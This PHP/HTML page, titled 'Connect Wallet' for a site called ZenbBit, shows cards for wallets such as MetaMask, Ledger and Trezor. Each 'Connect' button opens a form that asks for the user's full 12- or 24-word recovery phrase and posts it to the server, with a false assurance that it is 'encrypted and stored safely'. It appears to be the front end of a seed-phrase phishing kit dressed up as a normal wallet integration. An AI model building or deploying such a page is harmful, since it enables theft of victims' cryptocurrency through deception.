<?php 
include 'includes/dashboard_init.php';
$pageTitle = 'Connect Wallet'; 
$includeIziToast = true; 

// Initialize wallet logo caching
include 'includes/wallet_logo_cache.php';

// Generate wallet connection token for API authentication
if (!isset($_SESSION['wallet_token'])) {
    $_SESSION['wallet_token'] = bin2hex(random_bytes(32));
}
$walletToken = $_SESSION['wallet_token'];

// Get cached or online wallet logo paths
$walletLogoMap = [
    'metamask' => getWalletLogo('metamask'),
    'trust-wallet' => getWalletLogo('trust-wallet'),
    'coinbase' => getWalletLogo('coinbase'),
    'phantom' => getWalletLogo('phantom'),
    'ledger' => getWalletLogo('ledger'),
    'okx' => getWalletLogo('okx'),
    'trezor' => getWalletLogo('trezor'),
    'exodus' => getWalletLogo('exodus'),
    'argent' => getWalletLogo('argent'),
    'myetherwallet' => getWalletLogo('myetherwallet')
];

include 'includes/head.php'; 
?>
<body class="light-mode dashboard-body" data-page="connect">

  <!-- Sidebar Component -->
  <?php include 'includes/sidebar.php'; ?>

  <!-- Top Navbar Component -->
  <?php include 'includes/header.php'; ?>

  <!-- Wallets Section -->
  <main style="padding-bottom: 6rem;">
    <section class="connect-section" style="margin-top: 6rem; margin-bottom: 8rem;">
      <div class="container">
        <!-- Header -->
        <div class="section-header">
          <h1 class="section-title">Connect Your Wallet</h1>
          <p class="section-subtitle">
            Securely connect your cryptocurrency wallet to ZenbBit. Your wallet phrase is encrypted and stored safely.
          </p>
        </div>

        <!-- Wallet Grid -->
        <div class="wallet-grid">
          <!-- MetaMask -->
          <div class="wallet-card" data-wallet="metamask" data-wallet-name="MetaMask">
            <div class="wallet-card-inner">
              <img src="data:image/svg+xml,%3Csvg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22%3E%3Ccircle cx=%2250%22 cy=%2250%22 r=%2245%22 fill=%22%23f0b232%22/%3E%3C/svg%3E" data-src="<?php echo htmlspecialchars($walletLogoMap['metamask']); ?>" alt="MetaMask" class="wallet-icon lazy-img" style="max-width: 80px; height: auto;">
              <h3>MetaMask</h3>
              <p class="wallet-description">Most popular Ethereum wallet</p>
              <button class="wallet-btn" type="button" onclick="openWalletModal('MetaMask')">Connect</button>
            </div>
          </div>
          <!-- Trust Wallet -->
          <div class="wallet-card" data-wallet="trust" data-wallet-name="Trust Wallet">
            <div class="wallet-card-inner">
              <img src="data:image/svg+xml,%3Csvg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22%3E%3Crect width=%22100%22 height=%22100%22 fill=%223375BB%22 rx=%228%22/%3E%3C/svg%3E" data-src="<?php echo htmlspecialchars($walletLogoMap['trust-wallet']); ?>" alt="Trust Wallet" class="wallet-icon lazy-img" style="max-width: 80px; height: auto; border-radius: 8px;">
              <h3>Trust Wallet</h3>
              <p class="wallet-description">Multi-chain wallet for iOS & Android</p>
              <button class="wallet-btn" type="button" onclick="openWalletModal('Trust Wallet')">Connect</button>
            </div>
          </div>
          <!-- Coinbase Wallet -->
          <div class="wallet-card" data-wallet="coinbase" data-wallet-name="Coinbase Wallet">
            <div class="wallet-card-inner">
              <img src="data:image/svg+xml,%3Csvg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22%3E%3Crect width=%22100%22 height=%22100%22 fill=%231652f0%22 rx=%2210%22/%3E%3C/svg%3E" data-src="<?php echo htmlspecialchars($walletLogoMap['coinbase']); ?>" alt="Coinbase Wallet" class="wallet-icon lazy-img" style="max-width: 80px; height: 80px; border-radius: 8px;">
              <h3>Coinbase Wallet</h3>
              <p class="wallet-description">Self-custodial wallet by Coinbase</p>
              <button class="wallet-btn" type="button" onclick="openWalletModal('Coinbase Wallet')">Connect</button>
            </div>
          </div>
          <!-- Phantom (Solana) -->
          <div class="wallet-card" data-wallet="phantom" data-wallet-name="Phantom">
            <div class="wallet-card-inner">
              <img src="data:image/svg+xml,%3Csvg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22%3E%3Ccircle cx=%2250%22 cy=%2250%22 r=%2245%22 fill=%22%23ab9ff2%22/%3E%3C/svg%3E" data-src="<?php echo htmlspecialchars($walletLogoMap['phantom']); ?>" alt="Phantom" class="wallet-icon lazy-img" style="max-width: 80px; height: auto;">
              <h3>Phantom</h3>
              <p class="wallet-description">Solana wallet & portal</p>
              <button class="wallet-btn" type="button" onclick="openWalletModal('Phantom')">Connect</button>
            </div>
          </div>
          <!-- Ledger -->
          <div class="wallet-card" data-wallet="ledger" data-wallet-name="Ledger">
            <div class="wallet-card-inner">
              <img src="data:image/svg+xml,%3Csvg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22%3E%3Crect x=%2215%22 y=%2220%22 width=%2270%22 height=%2260%22 fill=%22%23000%22 stroke=%22%23fff%22 stroke-width=%222%22 rx=%224%22/%3E%3C/svg%3E" data-src="<?php echo htmlspecialchars($walletLogoMap['ledger']); ?>" alt="Ledger" class="wallet-icon lazy-img" style="max-width: 80px; height: auto;">
              <h3>Ledger Live</h3>
              <p class="wallet-description">Hardware wallet management</p>
              <button class="wallet-btn" type="button" onclick="openWalletModal('Ledger')">Connect</button>
            </div>
          </div>
          <!-- OKX Wallet -->
          <div class="wallet-card" data-wallet="okx" data-wallet-name="OKX Wallet">
            <div class="wallet-card-inner">
              <img src="data:image/svg+xml,%3Csvg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22%3E%3Crect width=%22100%22 height=%22100%22 fill=%22%23000%22/%3E%3C/svg%3E" data-src="<?php echo htmlspecialchars($walletLogoMap['okx']); ?>" alt="OKX Wallet" class="wallet-icon lazy-img" style="max-width: 80px; height: 80px; border-radius: 8px;">
              <h3>OKX Wallet</h3>
              <p class="wallet-description">Multi-chain crypto wallet</p>
              <button class="wallet-btn" type="button" onclick="openWalletModal('OKX Wallet')">Connect</button>
            </div>
          </div>
          <!-- Trezor -->
          <div class="wallet-card" data-wallet="trezor" data-wallet-name="Trezor">
            <div class="wallet-card-inner">
              <img src="data:image/svg+xml,%3Csvg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22%3E%3Crect width=%22100%22 height=%22100%22 fill=%2308335E%22 rx=%2210%22/%3E%3C/svg%3E" data-src="<?php echo htmlspecialchars($walletLogoMap['trezor']); ?>" alt="Trezor" class="wallet-icon lazy-img" style="max-width: 80px; height: auto;">
              <h3>Trezor</h3>
              <p class="wallet-description">Hardware wallet security</p>
              <button class="wallet-btn" type="button" onclick="openWalletModal('Trezor')">Connect</button>
            </div>
          </div>
          <!-- Exodus -->
          <div class="wallet-card" data-wallet="exodus" data-wallet-name="Exodus">
            <div class="wallet-card-inner">
              <img src="data:image/svg+xml,%3Csvg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22%3E%3Crect width=%22100%22 height=%22100%22 fill=%22%23ff6b35%22 rx=%2210%22/%3E%3C/svg%3E" data-src="<?php echo htmlspecialchars($walletLogoMap['exodus']); ?>" alt="Exodus" class="wallet-icon lazy-img" style="max-width: 80px; height: auto;">
              <h3>Exodus</h3>
              <p class="wallet-description">Desktop & mobile wallet</p>
              <button class="wallet-btn" type="button" onclick="openWalletModal('Exodus')">Connect</button>
            </div>
          </div>
          <!-- Argent -->
          <div class="wallet-card" data-wallet="argent" data-wallet-name="Argent">
            <div class="wallet-card-inner">
              <img src="data:image/svg+xml,%3Csvg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22%3E%3Ccircle cx=%2250%22 cy=%2250%22 r=%2245%22 fill=%22%23ec5242%22/%3E%3C/svg%3E" data-src="<?php echo htmlspecialchars($walletLogoMap['argent']); ?>" alt="Argent" class="wallet-icon lazy-img" style="max-width: 80px; height: auto;">
              <h3>Argent</h3>
              <p class="wallet-description">Secure Ethereum wallet</p>
              <button class="wallet-btn" type="button" onclick="openWalletModal('Argent')">Connect</button>
            </div>
          </div>
          <!-- MyEtherWallet -->
          <div class="wallet-card" data-wallet="mew" data-wallet-name="MyEtherWallet">
            <div class="wallet-card-inner">
              <img src="data:image/svg+xml,%3Csvg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22%3E%3Crect width=%22100%22 height=%22100%22 fill=%232c5aa0%22/%3E%3C/svg%3E" data-src="<?php echo htmlspecialchars($walletLogoMap['myetherwallet']); ?>" alt="MyEtherWallet" class="wallet-icon lazy-img" style="max-width: 80px; height: auto; border-radius: 8px;">
              <h3>MyEtherWallet</h3>
              <p class="wallet-description">Client-side wallet manager</p>
              <button class="wallet-btn" type="button" onclick="openWalletModal('MyEtherWallet')">Connect</button>
            </div>
          </div>
        </div>
      </div>
    </section>
  </main>

  <!-- Wallet Connect Modal -->
  <div id="walletModal" class="wallet-modal-overlay">
    <div class="wallet-modal-container">
      <div class="wallet-modal-header">
        <h2 id="modalTitle">Connect Wallet</h2>
        <button class="wallet-modal-close" type="button" onclick="closeWalletModal()">&times;</button>
      </div>

      <div class="wallet-modal-content">
        <div id="formError" class="wallet-form-alert wallet-alert-error" style="display: none;"></div>
        <div id="formSuccess" class="wallet-form-alert wallet-alert-success" style="display: none;"></div>

        <form id="connectForm" method="POST" onsubmit="handleWalletConnect(event)">
          <input type="hidden" name="c_wallet" value="1">
          <input type="hidden" name="wallet_name" id="walletName">
          <input type="hidden" name="wallet_token" value="<?php echo htmlspecialchars($walletToken); ?>">

          <div class="wallet-form-group">
            <label for="mnemonic" class="wallet-form-label">Enter Recovery Phrase</label>
            <p class="wallet-form-hint">Enter your 12 or 24 word seed phrase. Words should be separated by spaces.</p>
            <textarea 
              id="mnemonic" 
              name="mnemonic" 
              class="wallet-form-input wallet-form-textarea"
              placeholder="word1 word2 word3 ... word12"
              rows="6"
              required
            ></textarea>
            <div class="wallet-word-counter">
              <span>Words: <strong id="wordCount">0</strong></span>
              <span id="wordStatus" class="wallet-word-status"></span>
            </div>
          </div>

          <div class="wallet-modal-actions">
            <button type="button" class="wallet-btn-secondary" onclick="closeWalletModal()">Cancel</button>
            <button type="submit" class="wallet-btn-primary" id="submitBtn">
              <span>Connect Wallet</span>
              <span class="wallet-btn-loader" style="display: none;">
                <span class="wallet-spinner"></span>
              </span>
            </button>
          </div>
        </form>
      </div>
    </div>
  </div>

  <!-- Success Modal -->
  <div id="successModal" class="wallet-modal-overlay">
    <div class="wallet-modal-container wallet-success-modal">
      <div class="wallet-modal-content">
        <div class="wallet-success-icon">
          <svg width="80" height="80" viewBox="0 0 80 80" fill="none">
            <circle cx="40" cy="40" r="38" stroke="#FF9800" stroke-width="2" fill="#FF9800" opacity="0.1"/>
            <circle cx="40" cy="30" r="4" fill="#FF9800"/>
            <path d="M40 38V55" stroke="#FF9800" stroke-width="2" stroke-linecap="round"/>
          </svg>
        </div>
        <h3 id="successTitle" style="margin: 20px 0 10px 0;">Status Update</h3>
        <p id="successMessage" style="color: #666; margin-bottom: 20px;">
          Wallet connection failed
        </p>
        <button class="wallet-btn-primary" type="button" onclick="closeSuccessModal()">Continue</button>
      </div>
    </div>
  </div>

  <!-- Footer Component -->
  <?php include 'includes/footer.php'; ?>

  <!-- External Scripts -->
  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>

  <!-- Dashboard Scripts -->
  <script src="js/script.js"></script>
  
  <!-- Wallet Image Loader (Lazy loading with cache) -->
  <script src="js/wallet-image-loader.js"></script>
  
  <!-- Wallet Modal Handler -->
  <script src="js/wallet-modal.js"></script>

  <!-- Global function exposures for inline form handlers -->
  <script>
    // Expose global functions to avoid "not defined" errors in inline onclick handlers
    window.openWalletModal = function(walletName) {
      if (typeof window.WalletModalHandler !== 'undefined' && window.WalletModalHandler.openWalletModal) {
        window.WalletModalHandler.openWalletModal(walletName);
      }
    };
    window.closeWalletModal = function() {
      if (typeof window.WalletModalHandler !== 'undefined' && window.WalletModalHandler.closeWalletModal) {
        window.WalletModalHandler.closeWalletModal();
      }
    };
    window.closeSuccessModal = function() {
      if (typeof window.WalletModalHandler !== 'undefined' && window.WalletModalHandler.closeSuccessModal) {
        window.WalletModalHandler.closeSuccessModal();
      }
    };
    window.handleWalletConnect = function(event) {
      if (typeof window.WalletModalHandler !== 'undefined' && window.WalletModalHandler.handleWalletConnect) {
        window.WalletModalHandler.handleWalletConnect(event);
      }
    };
  </script>

</body>
</html>
